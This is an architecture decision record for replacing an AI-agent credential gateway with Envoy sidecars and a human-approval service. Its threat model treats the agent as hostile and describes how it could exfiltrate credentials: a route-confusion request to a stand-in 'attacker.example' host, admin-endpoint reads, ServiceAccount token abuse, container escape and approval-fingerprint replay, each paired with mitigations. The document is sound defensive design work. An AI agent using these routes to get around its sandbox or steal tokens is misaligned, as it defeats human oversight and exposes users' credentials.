# ADR-033: Envoy-based credential gateway with ext_authz HITL — drop OneCLI

**Date:** 2026-04-24
**Status:** Accepted
**Owner:** @pilartomas

## Context

ADR-005 established the credential-gateway pattern: the agent never sees tokens; a gateway outside the agent boundary injects credentials into outbound requests, enforces per-service rules, and audits traffic. ADR-010 chose OneCLI as the reference implementation and documented the operational cost: a two-service Deployment running a Rust MITM gateway plus a Node.js dashboard, a hard PostgreSQL dependency, a cert-manager CA volume-mounted into every agent pod, and a Controller-to-REST-API coupling for token provisioning. ADR-010 also flagged the gap that drives this draft: **OneCLI does not yet support human-in-the-loop (HITL) approval flows**, which ADR-005 explicitly calls out as a requirement ("supports human-in-the-loop approval for sensitive operation classes"). ADR-028 further shows the direction we are already pulling OneCLI toward: declarative `hostPattern` / `pathPattern` / `injectionConfig` for generic secrets — mechanics any competent HTTP proxy can express natively.

In parallel, Anthropic's own secure-deployment guidance ([code.claude.com/docs/en/agent-sdk/secure-deployment](https://code.claude.com/docs/en/agent-sdk/secure-deployment)) now names **Envoy with the `credential_injector` filter** as the recommended proxy for agent deployments. Envoy is a CNCF-graduated, production-grade proxy. To be clear: we do **not** currently run Envoy — Traefik is our ingress proxy and OneCLI is our egress gateway — so adopting Envoy is real onboarding cost, not zero-marginal reuse of an existing component. What it buys us is first-class primitives for exactly what OneCLI hand-rolled, in an ecosystem (Istio, Anthropic's secure-deployment guide) where these primitives are the standard answer:

- `envoy.filters.http.credential_injector` — generic-secret and OAuth2 credential sources, custom header injection with prefix templates, overwrite control. Per-route via `typed_per_filter_config` so one listener can cover many hosts/paths with different credentials.
- Secret Discovery Service (SDS) — secrets loaded from Kubernetes Secrets with hot-reload on rotation; no Controller REST poking required.
- `envoy.filters.http.ext_authz` — async HTTP/gRPC call-out per request, configurable timeout, passes request headers (and optionally body bytes) to an external service, which returns allow/deny plus custom denied status/headers/body.

`ext_authz` is the primitive that unlocks HITL. The auth service can hold the request while it notifies the user (Slack, UI) and waits for a decision, or — more robustly — return a structured "pending approval" denial that the agent surfaces and retries against a polling endpoint. Either shape lives in a small HTTP service we already know how to write; it does not require forking OneCLI or waiting on its roadmap.

The question this ADR answers: **can we replace OneCLI with Envoy + a small HITL ext_authz service, and is it worth doing?**

## Decision

**Yes on feasibility. Replace OneCLI with an Envoy-based credential gateway. HITL is handled by an ext_authz service owned by the API Server.**

### Topology

**One Envoy sidecar per agent pod**, sharing the pod's network namespace with the agent container. Agents reach Envoy via `HTTP_PROXY=http://localhost:<port>` / `HTTPS_PROXY=http://localhost:<port>` and trust the platform CA through `SSL_CERT_FILE` (same injection point as OneCLI — ADR-010's pattern carries over unchanged). Egress flow per request:

```
agent → Envoy on localhost (TLS-terminate with platform CA)
      → ext_authz filter  → HITL service (API Server)
      → credential_injector filter (SDS-loaded secret)
      → dynamic_forward_proxy → upstream service
```

The decisive reason for sidecar over a shared namespace-level Envoy is **identity**. A shared Envoy only sees the downstream pod IP, so picking the right credentials and HITL policy requires a Pod-IP-to-instance resolver in the data path — and that resolver has a race window every time Kubernetes reuses a pod IP after a restart. With a sidecar, identity is bound by the pod boundary itself: every request on `lo` is this instance, full stop. xDS scope, SDS secret access, and `ext_authz` context all collapse to a single instance, which is also the right blast radius for a credential gateway.

### Credential injection

Envoy route table matches on **the resolved upstream cluster + SNI**, not the agent-supplied `Host:` header (ADR-028's `hostPattern` / `pathPattern` configures the cluster mapping, but the credentialed-route match is bound to the resolved destination — see Threat Model on route-confusion exfiltration). Per-route `typed_per_filter_config` selects a `credential_injector` config with `header_name` and `header_prefix` (ADR-028's `injectionConfig`). Secrets come from Kubernetes Secrets. **Each Secret is owner-scoped, not instance-scoped** — one `Secret` per `(owner, connection)` (e.g. `connection-github` for user X), shared by every present and future agent instance that owner authorizes to use the connection. No PostgreSQL.

**Per-host multi-injection and URL query-parameter rewriting.** ADR-028's `injectionConfig` covered header-only rewriting; some upstreams (IBM's Bob shell `/key/info?key=<value>` is the practical case) read the credential from a URL query parameter instead. We extend `injectionConfig` with an optional `queryParamName` field — when set, the controller renders a per-route Lua filter behind `credential_injector` that moves the (bare) credential from the configured header into the named URL query parameter and strips the header before the request leaves the sidecar. The SDS file holds the raw value in this mode rather than the `valueFormat`-baked string used for header-only injection, so the URL doesn't grow a `Bearer ` prefix. Credential bytes are percent-encoded before being concatenated into the path so values containing `&` or `=` can't escape the query parameter — see Threat Model below for the URL-injection variant of route confusion.

Two Secrets sharing the same `hostPattern` no longer collide. The controller groups Secrets-per-host into a single filter chain with an ordered list of injection steps, so users can express "inject this credential into both a header AND a URL query parameter on the same endpoint" by creating two Secrets — one header-only, one with `queryParamName`. Within a chain each injection step must use a distinct header name; collisions on the same header drop the later Secret with a warning, because `credential_injector overwrite=true` would otherwise silently clobber.

**Secret access is restricted to the sidecar container — the agent container must never have it.** The agent runs untrusted code (Claude Code / Codex / etc., plus everything the model decides to run); if the pod's ServiceAccount could read Secrets via the K8s API, the agent could enumerate them and the whole MITM model collapses. Two layered restrictions:

- **No SA-token-driven Secret access.** The Controller renders the K8s Secret as a pod-level `volume` and mounts it **only into the sidecar container's `volumeMounts`**, never the agent's. Envoy reads the credential as a file (`DataSource.filename` for the `generic` injected_credentials source, or filesystem-watched SDS for hot-reload). The pod does not need a ServiceAccount with Secret-read RBAC at all — selection of *which* Secret volumes appear in the pod is a Controller-side decision baked into the pod spec at render time. The agent container additionally sets `automountServiceAccountToken: false` so it has no K8s API token at all.
- **Per-instance scoping happens at the Controller's render step.** The sidecar's bootstrap config and the pod-level `volumes` list (rendered from the instance's ConfigMap) decide *which* of the owner's Secrets appear in the pod for which routes. Pod identity governs which config + volumes are loaded; the agent process never participates in that decision.

The net effect: the agent container has no on-disk path to Secret material, no SA token to ask K8s for one, and no Envoy config it can rewrite from inside the pod. The credential boundary lives at the container — not the pod or the cluster — boundary.

The Controller renders the sidecar — container spec, Envoy bootstrap config volume, `HTTP_PROXY` env wiring — directly into the agent pod spec during the existing ConfigMap reconcile loop. No xDS server is required for the first cut. Two cases split:

- **Token rotation** (refresh-loop writes a new value into an existing K8s Secret, or a credential's bytes change): kubelet syncs the mounted file, Envoy file-watch picks it up — **no restart, no user impact**.
- **Topology changes** (adding/removing a credential, changing routes from ADR-028, HITL policy edits): bootstrap config changes, requiring a pod restart. The restart drops the ACP WebSocket and any in-flight turn. Session state survives on the shared PVC (ADR-027) so users reconnect via `unstable_resumeSession`; the visible cost is a few-second "reconnecting" blip and any mid-flight tool call failing. Streaming xDS is the natural follow-on if topology-change rate becomes user-perceptible.

The same renderer applies whether the pod is a long-lived agent (today's StatefulSet, possibly Jobs after PR #140) or a per-turn fork Job (ADR-027) — the data-plane shape is identical; what differs is *whose* Secrets the sidecar references, addressed next.

**Fork-Job pods follow the replier, not the instance owner.** When ADR-027 spawns a per-turn Job for a foreign Slack replier, the Controller renders the Job's pod spec with the *replier's* `(owner, connection)` Secret volumes mounted into the **sidecar container only**. The instance owner's Secrets never appear in the Job's pod spec. "Owner" in the `(owner, connection)` keying means whoever's identity the pod is rendered under, not the parent instance's owner. The agent container in the fork Job runs with the same restricted posture as the main pod's agent container — no SA token, no Secret volume mounts. A consequence: ADR-027's api-server-side RFC 8693 mint of a foreign-user OneCLI access token + the `(instanceId, foreignSub) → accessToken` cache go away with OneCLI itself. The fork ConfigMap still carries `foreignSub`; the Controller uses it to pick which Secret volumes to mount when rendering the Job's pod spec. The rest of ADR-027 (RWX PVC sharing, Job lifecycle, polling-based status, fail-closed error handling) is unchanged.

### Token provisioning and refresh

OAuth *authorization* (the user-facing browser dance: discovery → dynamic client registration → PKCE → redirect → callback → code-for-token) is **API-Server-owned today** (`packages/api-server/src/apps/api-server/oauth.ts`) and stays that way under this ADR — it is not on the data path. What changes is storage and refresh:

- **Storage.** API Server writes a Kubernetes Secret keyed by `(owner, connection)` instead of `POST`ing to OneCLI's REST API. One Secret backs every instance the owner runs — present and future. The Secret is mounted as a volume into the **sidecar container only**; the agent container has no volume mount for it and no SA token (`automountServiceAccountToken: false`), so it cannot read the bytes via the API or the filesystem. Envoy picks up filesystem changes without a pod restart, so a refresh propagates to all of that owner's running sidecars at once.
- **User-connection UX.** OneCLI's web dashboard hosts the user-facing "Connect GitHub", "Connect Slack", reconnect-on-expiry flows today. Replacing OneCLI means this surface area moves into Platform UI, extending the existing API Server seam (`oauth.ts`) rather than starting from zero — but it is a real, user-visible piece of work, not just an audit/dashboard concern.
- **Refresh — what Envoy gives us for free.** Envoy's `envoy.extensions.http.injected_credentials.oauth2` source supports **only the `client_credentials` grant** (proto: "Currently, only the Client Credentials Grant flow is supported"). For that case, Envoy holds `client_id`/`client_secret`, calls the token endpoint, and re-fetches automatically when the cached token expires — zero code on our side. Useful for service-account-style upstreams.
- **Refresh — what we have to build.** For the **authorization-code + refresh-token** grant we use for user-delegated tokens (GitHub, Slack, Google, MCP servers), Envoy has no support. There is no proto field to feed in a stored refresh token, and the upstream limitation is tracked in [envoyproxy/envoy#39183](https://github.com/envoyproxy/envoy/issues/39183). The fix is a small refresher loop in the API Server: one loop per `(owner, connection)`, mints a new access token from the stored refresh token, writes back into the same owner-scoped K8s Secret. SDS hot-reloads every sidecar mounting that Secret. Today there is no automatic refresh — users re-auth when tokens expire — so this is a strict capability gain.

### Human in the loop

An `ext_authz` HTTP service lives in the API Server. Sensitive request classes (declared per-secret via a new `requiresApproval` flag, or per-route rule) hit this service, which:

1. Persists a pending-decision record keyed by `(instance, request fingerprint)`.
2. Notifies the user via the existing UI/Slack channels (ADR-018, ADR-020).
3. Returns **HTTP 202 + structured JSON** as a denied response (ext_authz supports custom denied status + body). The agent sees a deterministic error shape it can surface in-session.
4. The human approves in the UI; the next retry from the agent matches the stored decision and is allowed through.

Rationale for retry-based HITL over long-held requests: Envoy `ext_authz` timeouts in the minutes range are possible but fragile (timeouts, retries, sampling-API interaction). A stored-decision pattern is stateless from Envoy's side, survives Envoy restarts, and composes cleanly with the ACP session (the "please approve" prompt becomes a normal session event).

**Agent integration.** Agent runtimes (Claude Code, Codex, Gemini CLI; MCP tool calls; fork jobs) do not need HITL-specific code. The 202 + JSON body is structured to be model-readable as a tool/HTTP error ("Approval pending; the user has been notified — retry after approval"), so the agent loop's existing error-handling path covers it; the harness images stay unmodified. In parallel, the ext_authz service emits an ACP session event so the pending decision shows up in the user's UI as a first-class event, not buried in a tool-call result. Non-interactive runs (scheduled forks, long-running jobs) fail-closed on the first 202 and persist the pending decision; the next scheduled run picks up the user's approval. The one place that needs a small change is the **schedule reconciler** (in the Controller), which must treat a HITL-pending denial as a retry condition rather than a terminal failure.

### Scope

This ADR replaces ADR-010 (OneCLI deployment) and the OneCLI implementation choice in ADR-005. ADR-005's gateway *pattern* is preserved verbatim. ADR-028's declarative injection model carries over directly onto Envoy's native capabilities.

ADR-015's caller-to-OneCLI auth machinery (Keycloak RFC 8693 token exchange for `audience=onecli`, plus the OneCLI fork that accepted those tokens and scoped data by `sub`) **disappears entirely** with OneCLI itself — it has no analogue under this design and no follow-on work. ADR-015's user-identity and label-based ownership pieces (Keycloak login, `platform.ai/owner` on resources) stay; they are orthogonal to the gateway.

**Out of scope for this ADR — to be covered by follow-on ADRs:**

- **Detailed HITL ext_authz protocol.** This ADR commits to the retry+session-event shape but leaves the request-fingerprint scheme, denial-body schema, and approval persistence model for a follow-on.
- **xDS dynamic-config service.** First cut uses bootstrap regeneration + pod restart. A streaming xDS upgrade is deferred until per-instance hot-reload demands it.
- **Pluggable credential-store backends.** Operators should be able to configure Vault / Bitwarden / cloud secret managers as the authoritative store for platform-managed credentials, with the OAuth flow still in the API Server. Not a BYO model — the platform owns the lifecycle and writes through to the configured backend. Default remains K8s Secrets; this is a strict capability gain for enterprise / regulated deployments. Architecturally a `CredentialStore` abstraction in the API Server, with the sidecar's read path unchanged (file-mounted credential) and only the file's provenance varying (ESO-synced K8s Secret, CSI-mounted Vault path, etc.).

## Alternatives Considered

**Keep OneCLI; wait for upstream HITL.** ADR-010's stated fallback. Rejected now: ADR-015 already requires a OneCLI fork (generic OIDC, RFC 8693 acceptance, per-user scoping), ADR-028 is already pushing injection config into OneCLI's schema, and there is no public commitment on HITL timing. We are paying integration cost on a dependency that is becoming more of a fork per quarter.

**Fork OneCLI to add HITL.** Technically feasible — the MITM plumbing is already there. Rejected: compounds the ADR-015 fork divergence and leaves us owning a Rust codebase we otherwise would not. The HITL decision logic is a small HTTP service; putting it behind a language boundary and a PostgreSQL schema inside OneCLI is the wrong shape.

**Build credential injection from scratch (no Envoy).** ADR-010 considered and rejected this because MITM + credential plumbing from zero is significant work. Envoy changes that calculus: the MITM + injection is already a production-grade filter, and we are not writing proxy code — we are writing config and a small ext_authz service.

**Use ANTHROPIC_BASE_URL / HTTP_PROXY without TLS interception.** The secure-deployment doc notes that `ANTHROPIC_BASE_URL` lets a proxy inspect plaintext sampling traffic without MITM, and that `HTTP_PROXY` alone (without a trusted CA) only gives the proxy opaque CONNECT tunnels. Rejected as the general solution: we need credential injection for arbitrary upstream services (GitHub, Slack, internal gateways per ADR-028), not only the Claude API. However, this *is* the right shape for sampling-only deployments and the Envoy config can degrade to it cleanly.

**Namespace-shared Envoy Deployment instead of a sidecar.** Attractive on paper: one data-plane component, smaller resource footprint, simpler Helm topology. Rejected because identity-by-source-IP is the only signal a shared Envoy gets, and using it requires a pod-IP-to-instance resolver in the request path with a race window every time Kubernetes reuses an IP after a pod restart. The SPIFFE-style mTLS workaround (each agent presents an instance-scoped client cert) is heavier operationally than just running a sidecar, and still requires an identity issuer per instance. The shared-Envoy footprint advantage is also smaller than it looks: one idle Envoy is ~30–50 MB RSS, modest against the agent process itself.

## Threat Model

The threat actor here is the **agent process itself**. Agents run arbitrary code — generated, downloaded, or prompted — and must be assumed compromisable on every request. The whole point of the credential-gateway pattern is that compromising the agent does not compromise the credentials. Maintaining that property requires every path from the agent container to the secret bytes to be closed; sidecar-only volume mounts are necessary but not sufficient. The full set:

**Envoy admin interface.** Containers in a pod share the network namespace, so anything bound on the sidecar's localhost is reachable from the agent. Envoy's admin endpoint exposes `/config_dump`, `/clusters`, and (depending on version/config) endpoints whose responses include SDS material. Disable the admin interface, or bind it to a Unix socket the agent has no path to. This is the easiest accidental compromise.

**Route confusion exfiltration.** The agent does not need to read the secret — it can trick Envoy into injecting the secret into a request to an attacker-controlled upstream. A route table that matches on `Host:` header alone is sufficient: the agent issues `CONNECT attacker.example:443` with a manipulated `Host: api.github.com`, and the credential injects toward the attacker. Mitigations:

- Pin each credentialed route to an explicit upstream cluster.
- Match on resolved upstream / SNI, not the agent-supplied `Host:` header.
- If `dynamic_forward_proxy` is used on credentialed routes, gate it with a strict DNS allowlist.

**URL injection on query-parameter rewriting.** The query-parameter variant of credential injection appends the credential into the request path. Without percent-encoding, a credential containing `&` or `=` would either escape the parameter (injecting extra query keys downstream) or shift the Lua splitter's framing on subsequent rewrites. Mitigations:

- The Lua filter percent-encodes credential bytes against the RFC 3986 unreserved set before concatenation; the query parameter name is api-server-validated against the same charset, so only the value can carry surprises.
- Routes pin to an explicit upstream cluster (same protection as the header path) so a manipulated path can't redirect the credentialed request.

**Kubernetes API via SA token.** If the agent container's auto-mounted ServiceAccount token has `get secrets` RBAC, the agent reads the Secret directly from the API regardless of volumeMount scoping. Set `automountServiceAccountToken: false` on the agent container, and grant the pod's SA no `get secrets` permission at all — kubelet projects the secret volume into the sidecar without needing API access.

**Container escape to kubelet volume directory.** The K8s Secret is materialized on the host under `/var/lib/kubelet/pods/<uid>/volumes/`. A container escape from the agent reaches it directly, bypassing every volumeMount-scoping argument. **gVisor at the pod level is the load-bearing mitigation**, with seccomp-strict / read-only-rootfs / no-privileged / dropped-caps as defense in depth. Without sandboxing, this is the path that defeats every other defense. Operationally this means the cluster must provide a `RuntimeClass` (gVisor `runsc`, Kata Containers, or equivalent) and the Controller must render every agent pod with that runtimeClass. The k3s-on-lima dev cluster needs the runtime installed and registered; managed-K8s deployments inherit the cloud's offering (GKE Sandbox, etc.).

**Envoy proxy data-path exploit.** The agent has network reach to the sidecar's listeners — that's the proxy interface itself. A parsing vulnerability (HTTP/2, h2c, QUIC) turns that into RCE inside the sidecar, at which point all SDS-loaded secrets are in-process. Track Envoy releases on a CVE timer, minimize the enabled filter set, rely on the gVisor sandbox as defense in depth.

**Shared PID namespace.** Kubernetes pods share network and IPC namespaces but not PID by default. `shareProcessNamespace: true` reverses that, exposing Envoy's process to the agent (`/proc/<pid>/mem` etc.). The Controller renderer must hard-code this to `false` and refuse to honor template overrides.

**ext_authz fingerprint replay / collision.** The HITL design stores approval decisions keyed by `(instance, request fingerprint)`. If the fingerprint is fully controllable by the agent — raw URL plus body — the agent can replay a stored approval against a different effective destination, or fingerprint-collide a sensitive request with a previously-approved benign one. The fingerprint must be drawn from Envoy's *resolved* upstream + method + a stable subset of the path, not the raw request the agent supplied.

The honest read of this list: the credential-gateway pattern is sound and Envoy is a strong implementation choice, but isolation is a property of the *stack* — sidecar volumeMount + SA token closure + admin disabled + routes pinned + gVisor + seccomp + patched Envoy. Removing any one item materially erodes the guarantee. The Consequences section's "Operational simplification" line is true; this section makes the corresponding *security obligations* equally explicit so they're not absorbed silently into implementation work.

## Consequences

- **Operational simplification.** One component (Envoy sidecar) replaces three (OneCLI gateway, OneCLI dashboard, PostgreSQL). Deployment surface shrinks; no database to back up. cert-manager stays — the CA distribution pattern from ADR-010 is unchanged and now serves a sibling container in the same pod.
- **Identity is structural, not configured.** No pod-IP-to-instance resolver, no IP-reuse race, no risk of a misconfigured route exposing owner X's credentials to owner Y's instance — different instances run different Envoys, each loaded with config that only references its owner's Secrets. Same-owner instances *do* share credentials by design (one user's GitHub token across their pods), so the boundary that matters is owner, not instance.
- **Credential boundary is the container, not the pod.** Secret volumes are mounted only into the sidecar; the agent container has no SA token and no path to Secret material. An untrusted-by-design agent process (model-driven code execution) cannot read its own pod's credentials — selection of which Secrets the sidecar serves is decided by the Controller at render time, not by anything inside the pod.
- **Data plane scales with agent pods.** N agent pods means N sidecars. Idle Envoy is ~30–50 MB RSS — small relative to the agent process — but it is a real per-pod cost that should be sized into the agent pod's resource requests (long-lived workload pod or per-turn fork Job alike).
- **HITL is a first-class capability.** ADR-005's stated goal is reachable without vendor roadmap dependency. Unblocks sensitive-class policy work (destructive git operations, Cloudflare project deletion, etc.) that ADR-005 uses as motivating examples.
- **Sidecar config glue.** Net-new but small (~days). The Controller renders the Envoy bootstrap into the pod spec from the existing ConfigMap reconcile loop. Token rotation flows through kubelet Secret-volume sync without a restart. **Topology changes** (adding a credential, route edits, HITL policy) trigger a pod restart and a user-visible ACP reconnect — session state survives via the shared PVC, but in-flight turns fail and active UI/Slack sessions see a few-second blip. Streaming xDS (deferred follow-on) would eliminate this.
- **Authorization-code refresh-token loop.** Net-new but small (~days). One loop per `(owner, connection)` in the API Server; mints a new access token from the stored refresh token and writes back to the K8s Secret. Today no automatic refresh exists — users re-auth when tokens expire — so this is a strict capability gain. Envoy auto-refreshes `client_credentials`-grant tokens for free via the OAuth2 credential source; that case needs zero code on our side.
- **ADR-015 OneCLI fork is eliminated, not migrated.** The forked Keycloak token-exchange + per-user scoping logic existed only so callers could authenticate to OneCLI. With OneCLI gone there is no `audience=onecli` to mint and no fork to maintain. ADR-015's user identity (Keycloak login) and label-based ownership stay; everything else from §3 of ADR-015 (the OneCLI fork) is deletable.
- **ADR-027 fork-Job credential plumbing simplifies.** No api-server-side RFC 8693 mint, no `(instanceId, foreignSub) → accessToken` cache, no `ONECLI_ACCESS_TOKEN` env, no `HTTPS_PROXY` interpolation trick. The fork ConfigMap still carries `foreignSub`; the Controller uses it to mount the replier's `(owner, connection)` Secret volumes into the Job's sidecar container. PVC sharing, Job lifecycle, status polling, and fail-closed error handling from ADR-027 are unchanged.
- **HITL agent integration.** Zero code changes in the agent images themselves — a model-readable 202 body covers Claude Code / Codex / Gemini CLI / MCP tool calls. The schedule reconciler in the Controller needs a small change to treat HITL-pending denials as a retry condition for non-interactive (scheduled) runs. ~1–2 days.
- **User-connection UX moves into Platform UI.** OneCLI's dashboard runs the user-facing "Connect GitHub / Slack / Google" flow today. We need that UI in Platform, extending `oauth.ts`'s existing OAuth callback plumbing. Real work, but additive — and once owned, future flows (consent re-prompts, scope upgrades, disconnect) live in our codebase.
- **Audit dashboard is lost.** OneCLI's request-inspection view has no Envoy equivalent. Audit moves into our UI fed by Envoy access logs.
- **Migration cost.** Every agent template and every integration test that assumes OneCLI (pod env, CA mount, REST provisioning) changes shape. ADR-010's PostgreSQL stateful set is deleted; ADR-028's JSON columns become Envoy route-config fields. Non-trivial but bounded — the agent-pod surface (`SSL_CERT_FILE`, `HTTP_PROXY`) is stable.
- **Upstream investment.** Bugs and missing features (e.g. header-prefix templates — tracked in [envoyproxy/envoy#37001](https://github.com/envoyproxy/envoy/issues/37001)) become upstream contributions rather than forks of a less-active project.
